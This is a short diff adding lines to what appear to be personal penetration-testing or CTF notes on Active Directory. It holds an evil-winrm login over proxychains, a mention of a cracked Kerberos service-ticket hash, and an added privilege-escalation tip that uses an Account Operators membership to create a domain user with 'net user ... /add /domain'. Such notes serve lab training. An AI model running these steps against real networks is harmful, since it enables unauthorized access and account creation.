@@ -649,3 +649,9 @@ WE GET The Administrator Ticket HASH with the REF (krb5tgs$23):
     proxychains -q evil-winrm -u svcScanning -p <Passwd> -i 10.200.116.31
 
     *Evil-WinRM* PS C:\Users\svcScanning\Documents> 
+
+
+Windows Priv Esc:
+  sometimes 'svc-service account' are memeber of "Account Operator" which allows to create new user:
+    *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user adib adib1234 /add /domain
+   Please check forest.sh
